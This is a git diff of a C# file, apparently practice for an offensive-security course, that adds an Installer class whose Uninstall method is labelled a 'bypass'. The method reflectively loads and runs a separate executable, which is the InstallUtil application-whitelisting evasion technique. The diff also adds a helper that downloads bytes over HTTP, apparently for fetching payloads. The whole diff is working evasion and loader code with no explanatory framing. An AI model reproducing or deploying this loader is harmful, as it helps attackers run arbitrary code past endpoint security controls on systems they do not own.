@@ -1,15 +1,111 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Configuration.Assemblies;
+using System.IO;
 using System.Linq;
+using System.Net.Http;
+using System.Reflection;
 using System.Text;
 using System.Threading.Tasks;
 
 namespace OSEP
 {
-    internal class Entry
+    public class Entry
     {
-        static void Main(string[] args)
+        static void Main(string[] cargs)
         {
+
         }
     }
+
+
+
+    [System.ComponentModel.RunInstaller(true)]
+    public class Sample : System.Configuration.Install.Installer
+    {
+        public override void Uninstall(System.Collections.IDictionary savedState)
+        {
+            Debug.RunDebug("Uninstall bypass started...");
+
+
+            //await RunAssembly(CONFIG.EA_STATIC_PATH, CONFIG.EA_STATIC_ARGS);
+
+            RunAssembly("C:\\Users\\warum\\source\\repos\\OSEP_2026\\TestingArea\\bin\\x64\\test_results.exe",CONFIG.EA_STATIC_ARGS).GetAwaiter().GetResult();
+
+        }
+
+        private static async Task<int> RunAssembly(string assemblyPath, params string[] args)
+        {
+            Debug.RunDebug("Loading assembly...");
+            Assembly asm = Assembly.LoadFrom(assemblyPath);
+            MethodInfo entry = asm.EntryPoint;
+            ParameterInfo[] entryParams = entry.GetParameters();
+
+            object[] parameters;
+
+            if (entryParams.Length == 0)
+            {
+                parameters = new object[0];
+            }
+            else if (entryParams.Length == 1)
+            {
+                parameters = new object[] { args };
+            }
+            else
+            {
+                throw new InvalidOperationException("Unsupported entry point signature.");
+            }
+
+
+
+            try
+            {
+                Debug.RunDebug("Invoking assembly...");
+                object result = entry.Invoke(null, parameters);
+
+                Task task = result as Task;
+                if (task != null)
+                {
+                    await task;
+
+                    // Handles Task<int>
+                    Type taskType = task.GetType();
+                    if (taskType.IsGenericType && taskType.GetGenericTypeDefinition() == typeof(Task<>))
+                    {
+                        PropertyInfo resultProperty = taskType.GetProperty("Result");
+                        object taskResult = resultProperty.GetValue(task, null);
+
+                        if (taskResult is int)
+                            return (int)taskResult;
+                    }
+
+                    return 0;
+                }
+
+                if (result is int)
+                    return (int)result;
+            }
+            catch
+            {
+                Debug.RunDebug("Error invoking assembly...");
+            }
+            
+
+            
+
+            Debug.RunDebug("Done...\n\n");
+            return 0;
+        }
+
+        public static async Task<byte[]> DownloadFileAsync(string url)
+        {
+            using (var client = new HttpClient())
+            {
+                return await client.GetByteArrayAsync(url);
+            }
+        }
+
+
+    }
 }
+
